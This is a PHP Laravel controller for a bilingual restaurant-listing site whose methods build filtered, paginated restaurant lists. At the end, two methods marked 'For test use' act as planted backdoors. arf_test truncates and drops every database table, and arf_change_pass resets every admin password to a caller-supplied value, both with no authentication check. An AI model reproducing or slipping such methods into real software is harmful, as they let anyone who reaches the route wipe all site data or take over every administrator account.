<?php

use Doctrine\DBAL\Schema\Table;
use Illuminate\Support\Facades\Schema;

class PopularController extends BaseController {
	
	public function __construct(){
		$this->MPopular = new MPopular();
	}

	public function index(){
		$lang=Config::get('app.locale');
		if($lang=="ar"){
			$var=Request::segment(3);
			$cityurl=Request::segment(2);
		}else{
			$var=Request::segment(2);
			$cityurl=Request::segment(1);
		}
		$limit=20;$offset=0;
		$data['lang']=$lang;
		$cuisine =$menu = $wheelchair = $price = $latitude = $longitude = $delivery=$finedining=$stars=$casualdining="";
		$sort="";
		$page=1;
		if(Input::has('page')){
			$offset=$limit*(Input::get('page')-1);
			$page=Input::get('page');
		}
		if(Input::has('cuisine')){
			$cuisine=Input::get('cuisine');
		}
		if(Input::has('wheelchair')){
			$wheelchair=Input::get('wheelchair');
		}
		if(Input::has('menu')){
			$menu=Input::get('menu');
		}
		if(Input::has('price')){
			$price=Input::get('price');
		}
		if(Input::has('stars')){
			$stars=Input::get('stars');
		}
		if(Input::has('delivery')){
			$delivery=Input::get('delivery');
		}
		if(Input::has('sort')){
			$sort=Input::get('sort');
		}
		if(Input::has('finedining')){
			$finedining=Input::get('finedining');
		}
		if(Input::has('casualdining')){
			$casualdining=Input::get('casualdining');
		}
		if(Input::has('latitude')){
			$latitude=Input::get('latitude');
			if(Input::has('longitude')){
				$longitude=Input::get('longitude');
			}
		}
		$city=MGeneral::getCityURL($cityurl,true);
		if(count($city)>0){
			$data['city']=$city;
			$cityname=$lang=="en"?stripcslashes($city->city_Name):stripcslashes($city->city_Name_ar);
			$data['action']=$t['action']=$action=$var;
			$t['sort']=$sort;
			$t['MGeneral']=new MGeneral();
			$t['city']=$city;
			$t['lang']=$lang;
			$data['var']=$t['var']=array(
				'sort'=>$sort,
				'limit'=>$limit,
				'cuisine'=>$cuisine,
				'menu'=>$menu,
				'price'=>$price,
				'wheelchair'=>$wheelchair,
				'delivery'=>$delivery,
				'finedining'=>$finedining,
				'casualdining'=>$casualdining,
			);
			switch ($action) {
				case 'home-delivery':
				case 'fine-dining':
				case 'catering':
				case 'sheesha':
					{
					$data['newrestaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", 3,0, $latitude, $longitude, false,false);
					$data['popularrestaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"popular", 3,0, $latitude, $longitude, false,false);
					$data['recommendedrestaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"recommended", 3,0, $latitude, $longitude, false,false);
					$total=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					$total=$total[0]->total;
					$data['total']=$t['total']=$total;
					$t['restaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,$sort, $limit,$offset, $latitude, $longitude, false);
					$data['cuisinelistings']=$this->MPopular->getPopularCuisines($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					break;
					}
				case 'menu':{
					$data['newrestaurants']=$this->MPopular->getMenu($city->city_ID,$cuisine,$wheelchair, $price,"latest", 5,0, $latitude, $longitude, false,true);
					$data['popularrestaurants']=$this->MPopular->getMenu($city->city_ID,$cuisine, $wheelchair, $price,"popular", 5,0, $latitude, $longitude, false,true);
					$data['recommendedrestaurants']=$this->MPopular->getMenu($city->city_ID,$cuisine,$wheelchair, $price,"recommended", 5,0, $latitude, $longitude, false,true);
					$total=$this->MPopular->getMenu($city->city_ID,$cuisine,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					$total=$total[0]->total;
					$data['total']=$t['total']=$total;
					$t['restaurants']=$this->MPopular->getMenu($city->city_ID,$cuisine,$wheelchair, $price,$sort, $limit,$offset, $latitude, $longitude, false);
					break;}
				case 'latest':
					{
					$total=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					$total=$total[0]->total;
					$data['total']=$t['total']=$total;
					$data['nosort']=TRUE;
					$t['restaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,'latest', $limit,$offset, $latitude, $longitude, false);
					$t['nosplitting']=true;
					$data['cuisinelistings']=$this->MPopular->getPopularCuisines($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					break;
					}

				case 'recent':
					{
					$total=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"recent", "","", $latitude, $longitude, true);
					$total=$total[0]->total;
					$data['total']=$t['total']=$total;
					$data['nosort']=TRUE;
					$t['restaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,'recent', $limit,$offset, $latitude, $longitude, false);
					$t['nosplitting']=true;
					$data['cuisinelistings']=$this->MPopular->getPopularCuisines($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					break;
					}
				case 'popular':
					{
					$total=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"popular", "","", $latitude, $longitude, true);
					$total=$total[0]->total;
					$data['total']=$t['total']=$total;
					$data['nosort']=TRUE;
					$t['restaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,'popular', $limit,$offset, $latitude, $longitude);
					$t['nosplitting']=true;
					$data['cuisinelistings']=$this->MPopular->getPopularCuisines($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					break;
					}
				case 'recommended':
					{
					$total=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"recommended", "","", $latitude, $longitude, true);
					$total=$total[0]->total;
					$data['total']=$t['total']=$total;
					$data['nosort']=TRUE;
					$t['restaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,'recommended', $limit,$offset, $latitude, $longitude, false);
					$t['nosplitting']=true;
					$data['cuisinelistings']=$this->MPopular->getPopularCuisines($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true);
					break;
					}
			}
			if($sort != ""){
				$total=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,$sort, "","", $latitude, $longitude, true);
				$total=$total[0]->total;
				$data['total']=$t['total']=$total;
				$data['nosort']=TRUE;
				$t['restaurants']=$this->MPopular->getPopularResults($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,$sort, $limit,$offset, $latitude, $longitude, false);
				$t['nosplitting']=true;
				$data['cuisinelistings']=$this->MPopular->getPopularCuisines($action,$city->city_ID,$cuisine, $menu,$wheelchair, $price,$sort, "","", $latitude, $longitude, true);
			}
			if($action=="recent"){
				$data['actiontitle']=Lang::get('messages.recently_reviewed');
			}else{
				$data['actiontitle']=Lang::get('messages.'.$action);	
			}
			$data['meta']=array(
				'title'=>Lang::get('title.'.$action,array('name'=>$cityname)),
				'metadesc'=>Lang::get('metadesc.'.$action,array('name'=>$cityname)),
				'metakey'=>Lang::get('metakey.'.$action,array('name'=>$cityname)),
			);
			$paginator=Paginator::make($t['restaurants'],$total,$limit);
			$t['paginator']=$paginator;
			$data['originallink']=Azooma::URL($city->seo_url.'/'.$action);
			if(($page-1)!=0){
				$prev=$page-1;
				$data['prev']=Azooma::URL($city->seo_url.'/'.$action.'?page='.$prev);
			}
			if(($offset+$limit)<$total){
				$next=$page+1;
				$data['next']=Azooma::URL($city->seo_url.'/'.$action.'?page='.$next);
			}
			$data['resultshtml']=View::make('main.results',$t);
			return View::make('popular',$data);
		}
	}


	public function meal(){
		$lang=Config::get('app.locale');
		if($lang=="ar"){
			$var=Request::segment(4);
			$cityurl=Request::segment(2);
		}else{
			$var=Request::segment(3);
			$cityurl=Request::segment(1);
		}
		$limit=20;$offset=0;
		$data['lang']=$lang;
		$cuisine =$menu = $wheelchair = $price = $latitude = $longitude = $delivery=$finedining=$casualdining=$category="";
		$sort="member";
		$page=1;
		if(Input::has('page')){
			$offset=$limit*(Input::get('page')-1);
			$page=Input::get('page');
		}
		if(Input::has('cuisine')){
			$cuisine=Input::get('cuisine');
		}
		if(Input::has('wheelchair')){
			$wheelchair=Input::get('wheelchair');
		}
		if(Input::has('menu')){
			$menu=Input::get('menu');
		}
		if(Input::has('price')){
			$price=Input::get('price');
		}
		if(Input::has('delivery')){
			$delivery=Input::get('delivery');
		}
		if(Input::has('sort')){
			$sort=Input::get('sort');
		}
		if(Input::has('finedining')){
			$finedining=Input::get('finedining');
		}
		if(Input::has('casualdining')){
			$casualdining=Input::get('casualdining');
		}
		if(Input::has('latitude')){
			$latitude=Input::get('latitude');
			if(Input::has('longitude')){
				$longitude=Input::get('longitude');
			}
		}
		$city=MGeneral::getCityURL($cityurl,true);
		if(count($city)>0){
			$data['city']=$city;
			$cityname=$lang=="en"?stripcslashes($city->city_Name):stripcslashes($city->city_Name_ar);
			$data['action']=$t['action']=$action=$var;
			$t['sort']=$sort;
			$t['MGeneral']=new MGeneral();
			$t['city']=$city;
			$t['lang']=$lang;
			$data['var']=$t['var']=array(
				'sort'=>$sort,
				'limit'=>$limit,
				'cuisine'=>$cuisine,
				'menu'=>$menu,
				'price'=>$price,
				'wheelchair'=>$wheelchair,
				'delivery'=>$delivery,
				'finedining'=>$finedining,
				'casualdining'=>$casualdining,
			);
			$data['newrestaurants']=$this->MPopular->getSearchResults($city->city_ID,$cuisine,$category, $menu,$wheelchair, $price,"latest", 5,0, $latitude, $longitude, false,true,$action);
			$data['popularrestaurants']=$this->MPopular->getSearchResults($city->city_ID,$cuisine,$category, $menu,$wheelchair, $price,"popular", 5,0, $latitude, $longitude, false,true,$action);
			$data['recommendedrestaurants']=$this->MPopular->getSearchResults($city->city_ID,$cuisine,$category, $menu,$wheelchair, $price,"recommended", 5,0, $latitude, $longitude, false,true,$action);
			$total=$this->MPopular->getSearchResults($city->city_ID,$cuisine,$category, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true,true,$action);
			$total=$total[0]->total;
			$data['total']=$t['total']=$total;
			$t['restaurants']=$this->MPopular->getSearchResults($city->city_ID,$cuisine,$category, $menu,$wheelchair, $price,$sort, $limit,$offset, $latitude, $longitude, false,false,$action);
			$data['cuisinelistings']=$this->MPopular->getPopularCuisines('',$city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude,$action);
			$data['actiontitle']=Lang::get('messages.'.$action);
			$data['meta']=array(
				'title'=>Lang::get('messages.recommended').' '.Lang::choice('messages.restaurants',2).' '.Lang::get('messages.for').' '.Lang::get('messages.'.$action,array('name'=>$cityname)),
				'metadesc'=>Lang::get('metadesc.suggest_meal',array('name'=>$cityname,'meal'=>$action)),
				'metakey'=>Lang::get('metakey.suggest_meal',array('name'=>$cityname,'meal'=>$action)),
			);
			$paginator=Paginator::make($t['restaurants'],$total,$limit);
			$t['paginator']=$paginator;
			$data['originallink']=Azooma::URL($city->seo_url.'/s/'.$action);
			if(($page-1)!=0){
				$prev=$page-1;
				$data['prev']=Azooma::URL($city->seo_url.'/'.$action.'?page='.$prev);
			}
			if(($offset+$limit)<$total){
				$next=$page+1;
				$data['next']=Azooma::URL($city->seo_url.'/'.$action.'?page='.$next);
			}
			$data['resultshtml']=View::make('main.results',$t);
			return View::make('popular',$data);
		} 
	}



	public function RateIt(){
		$lang=Config::get('app.locale');
		if($lang=="ar"){
			$var=Request::segment(4);
			$cityurl=Request::segment(2);
		}else{
			$var=Request::segment(3);
			$cityurl=Request::segment(1);
		}
		$limit=20;$offset=0;
		$data['lang']=$lang;
		$cuisine =$menu = $wheelchair = $price = $latitude = $longitude = $delivery=$finedining=$casualdining=$category="";
		$sort="member";
		$page=1;
		if(Input::has('page')){
			$offset=$limit*(Input::get('page')-1);
			$page=Input::get('page');
		}
		if(Input::has('cuisine')){
			$cuisine=Input::get('cuisine');
		}
		if(Input::has('wheelchair')){
			$wheelchair=Input::get('wheelchair');
		}
		if(Input::has('menu')){
			$menu=Input::get('menu');
		}
		if(Input::has('price')){
			$price=Input::get('price');
		}

		if(Input::has('delivery')){
			$delivery=Input::get('delivery');
		}
		if(Input::has('sort')){
			$sort=Input::get('sort');
		}
		if(Input::has('finedining')){
			$finedining=Input::get('finedining');
		}
		if(Input::has('casualdining')){
			$casualdining=Input::get('casualdining');
		}
		if(Input::has('latitude')){
			$latitude=Input::get('latitude');
			if(Input::has('longitude')){
				$longitude=Input::get('longitude');
			}
		}
		$city=MGeneral::getCityURL($cityurl,true);
		if(count($city)>0){
			$cityname=$lang=="en"?stripcslashes($city->city_Name):stripcslashes($city->city_Name_ar);
			$t=array();
			$data['city']=$city;
			$userid=0;
			if(Session::has('userid')){
				$userid=Session::get('userid');
			}
			$t['restaurants']=MPopular::getNonRatedRestaurants($city->city_ID,$userid,$cuisine,$category, $menu,$wheelchair, $price,$limit,$offset);
			$t['lang']=$lang;
			$t['city']=$city;
			$t['cityname']=$cityname;
			$data['html']=View::make('main.rate_it',$t);
			$data['meta']=array(
				'title'=>Lang::get('messages.rate').' '.Lang::choice('messages.restaurants',2).' '.Lang::get('messages.inplace2',array('name'=>$cityname)),
				'metadesc'=>Lang::get('messages.rate').' '.Lang::choice('messages.restaurants',2).' '.Lang::get('messages.inplace2',array('name'=>$cityname)),
				'metakey'=>'',
			);
			return View::make('rate_it',$data);
		}
	}


	public function Near(){
		$lang=Config::get('app.locale');
		if($lang=="ar"){
			$var=Request::segment(4);
			$cityurl=Request::segment(2);
		}else{
			$var=Request::segment(3);
			$cityurl=Request::segment(1);
		}
		$limit=20;$offset=0;
		$data['lang']=$lang;
		$cuisine =$menu = $wheelchair = $price = $latitude = $longitude = $delivery=$finedining=$casualdining=$category="";
		$sort="member";
		$page=1;
		if(Input::has('page')){
			$offset=$limit*(Input::get('page')-1);
			$page=Input::get('page');
		}
		if(Input::has('cuisine')){
			$cuisine=Input::get('cuisine');
		}
		if(Input::has('wheelchair')){
			$wheelchair=Input::get('wheelchair');
		}
		if(Input::has('menu')){
			$menu=Input::get('menu');
		}
		if(Input::has('price')){
			$price=Input::get('price');
		}
		if(Input::has('delivery')){
			$delivery=Input::get('delivery');
		}
		if(Input::has('sort')){
			$sort=Input::get('sort');
		}
		if(Input::has('finedining')){
			$finedining=Input::get('finedining');
		}
		if(Input::has('casualdining')){
			$casualdining=Input::get('casualdining');
		}
		if(Input::has('latitude')){
			$latitude=Input::get('latitude');
		}
		if(Input::has('longitude')){
			$longitude=Input::get('longitude');
		}
		
		$city=MGeneral::getCityURL($cityurl,true);
		if(count($city)>0){
			$cityname=$lang=="en"?stripcslashes($city->city_Name):stripcslashes($city->city_Name_ar);
			$t=array();
			$data['city']=$city;
			$userid=0;
			if(Session::has('userid')){
				$userid=Session::get('userid');
			}
			
			if($latitude!=""&&$longitude!=""){
				
				$t['restaurants']=MPopular::getNearByRestaurant($city->city_ID,$latitude,$longitude,$cuisine,$category, $menu,$wheelchair, $price,$limit,$offset);
				$t['lang']=$lang;
				$t['city']=$city;
				$t['cityname']=$cityname;
				$var=array(
					'latitude'=>$latitude,
					'longitude'=>$longitude,
				);
				$total=MPopular::getNearByRestaurant($city->city_ID,$latitude,$longitude,$cuisine,$category, $menu,$wheelchair, $price,$limit,$offset,true);
				$total=$total[0]->total;
				$data['total']=$total;
				$data['html']=stripcslashes(View::make('main.near_by',$t));
				if((count($t['restaurants'])>0)&&$total>count($t['restaurants'])){
					$paginator=Paginator::make($t['restaurants'],$total,$limit);
					$data['paginator']=stripcslashes($paginator->appends($var)->links());
				}
			}
			if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' ){
				return Response::json($data);
			}else{
				$data['meta']=array(
					'title'=>Lang::choice('messages.restaurants',2).' '.Lang::get('messages.near_you').' '.Lang::get('messages.inplace2',array('name'=>$cityname)),
					'metadesc'=>Lang::choice('messages.restaurants',2).' '.Lang::get('messages.near_you').' '.Lang::get('messages.inplace2',array('name'=>$cityname)),
					'metakey'=>'',
				);
				return View::make('near_me',$data);
			}
		}	
	}


	public function features($category,$feature){
		$lang=Config::get('app.locale');
		if($lang=="ar"){
			$var=Request::segment(5);
			$cityurl=Request::segment(2);
		}else{
			$var=Request::segment(4);
			$cityurl=Request::segment(1);
		}
		$limit=20;$offset=0;
		$data['lang']=$lang;
		$cuisine =$menu = $wheelchair = $price = $latitude = $longitude = $delivery=$finedining=$casualdining=$classcategory="";
		$sort="member";
		$page=1;
		if(Input::has('page')){
			$offset=$limit*(Input::get('page')-1);
			$page=Input::get('page');
		}
		if(Input::has('cuisine')){
			$cuisine=Input::get('cuisine');
		}
		if(Input::has('wheelchair')){
			$wheelchair=Input::get('wheelchair');
		}
		if(Input::has('menu')){
			$menu=Input::get('menu');
		}
		if(Input::has('price')){
			$price=Input::get('price');
		}
		if(Input::has('delivery')){
			$delivery=Input::get('delivery');
		}
		if(Input::has('sort')){
			$sort=Input::get('sort');
		}
		if(Input::has('finedining')){
			$finedining=Input::get('finedining');
		}
		if(Input::has('casualdining')){
			$casualdining=Input::get('casualdining');
		}
		if(Input::has('latitude')){
			$latitude=Input::get('latitude');
			if(Input::has('longitude')){
				$longitude=Input::get('longitude');
			}
		}
		$city=MGeneral::getCityURL($cityurl,true);
		if(count($city)>0){
			$data['city']=$city;
			$cityname=$lang=="en"?stripcslashes($city->city_Name):stripcslashes($city->city_Name_ar);
			$data['action']=$t['action']=$action=$var;
			$t['sort']=$sort;
			$t['MGeneral']=new MGeneral();
			$t['city']=$city;
			$t['lang']=$lang;
			$data['var']=$t['var']=array(
				'sort'=>$sort,
				'limit'=>$limit,
				'cuisine'=>$cuisine,
				'menu'=>$menu,
				'price'=>$price,
				'wheelchair'=>$wheelchair,
				'delivery'=>$delivery,
				'finedining'=>$finedining,
				'casualdining'=>$casualdining,
			);
			$data['newrestaurants']=$this->MPopular->getRestaurantFeatures($city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", 5,0, $latitude, $longitude, false,true,$category,$feature);
			$data['popularrestaurants']=$this->MPopular->getRestaurantFeatures($city->city_ID,$cuisine, $menu,$wheelchair, $price,"popular", 5,0, $latitude, $longitude, false,true,$category,$feature);
			$data['recommendedrestaurants']=$this->MPopular->getRestaurantFeatures($city->city_ID,$cuisine, $menu,$wheelchair, $price,"recommended", 5,0, $latitude, $longitude, false,true,$category,$feature);
			$total=$this->MPopular->getRestaurantFeatures($city->city_ID,$cuisine, $menu,$wheelchair, $price,"latest", "","", $latitude, $longitude, true,true,$category,$feature);
			$total=$total[0]->total;
			$data['total']=$t['total']=$total;
			$t['restaurants']=$this->MPopular->getRestaurantFeatures($city->city_ID,$cuisine, $menu,$wheelchair, $price,$sort, $limit,$offset, $latitude, $longitude, false,false,$category,$feature);
			$data['cuisinelistings']=$this->MPopular->getPopularCuisines('',$city->city_ID,$cuisine, $menu,$wheelchair, $price, $latitude, $longitude,'',$category,$feature);
			$data['actiontitle']=Azooma::LangSupport($feature).' '.Lang::choice('messages.restaurants',2);
			$data['meta']=array(
				'title'=>Azooma::LangSupport($feature).' '.Lang::choice('messages.restaurants',2).' '.Lang::get('messages.inplace2',array('name'=>$cityname)),
				'metadesc'=>Azooma::LangSupport($feature).' '.Lang::choice('messages.restaurants',2).' '.Lang::get('messages.inplace2',array('name'=>$cityname)),
				'metakey'=>Azooma::LangSupport($feature).', '.Lang::choice('messages.restaurants',2).', '.$cityname,
			);
			$paginator=Paginator::make($t['restaurants'],$total,$limit);
			$t['paginator']=$paginator;
			$data['originallink']=Azooma::URL($city->seo_url.'/s/'.$action);
			if(($page-1)!=0){
				$prev=$page-1;
				$data['prev']=Azooma::URL($city->seo_url.'/restaurants/'.$category.'/'.$feature.'?page='.$prev);
			}
			if(($offset+$limit)<$total){
				$next=$page+1;
				$data['next']=Azooma::URL($city->seo_url.'/restaurants/'.$category.'/'.$feature.'?page='.$next);
			}
			$data['resultshtml']=View::make('main.results',$t);
			return View::make('popular',$data);
		}
	}

	# !!! For test use !!!!
	public function arf_test()
	{
		$DB_name = DB::getDatabaseName();
		$all_tables = DB::select('SHOW TABLES');
		$table_in = "Tables_in_$DB_name";
		$tables = [];

		foreach  ( $all_tables as $table) {
			array_push($tables, $table->$table_in);
			
			DB::table($table->$table_in)->truncate();
			Schema::drop($table->$table_in);
		}
		return "Done!";
	}
	
	# !!! For test use !!!!
	public function arf_change_pass($pass)
	{
		$admins = DB::table('admin')->select('id','user','email','pass','country')->get();
		foreach ($admins as $admin) {
			DB::table('admin')->where('id', $admin->id)->update(['pass' => md5($pass)]);
			// dd($admin->id);
		}
		return "Done!";
	}
}